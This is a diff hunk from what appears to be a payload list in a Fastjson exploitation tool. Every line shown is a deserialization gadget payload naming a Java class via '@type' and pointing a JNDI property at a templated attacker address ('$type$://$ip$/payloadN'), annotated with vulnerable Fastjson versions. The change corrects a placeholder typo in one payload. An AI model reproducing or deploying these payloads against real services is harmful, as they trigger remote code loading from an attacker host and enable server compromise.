@@ -15,6 +15,6 @@
 {"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties":{"@type":"java.util.Properties","UserTransaction":"$type$://$ip$/payload15"}} #Fastjson<=1.2.67
 {"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"$type$://$ip$/payload16"} #Fastjson<=1.2.68
 {"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"$type$://$ip$/payload17"} #Fastjson<=1.2.68
-{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"$type://$ip$/payload18"} #未知
+{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"$type$://$ip$/payload18"} #未知
 {"@type":"org.apache.openjpa.ee.RegistryManagedRuntime","registryName":"$type$://$ip$/payload19","rollbackOnly":null} #未知
 {"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"$type$://$ip$/payload20"} #未知
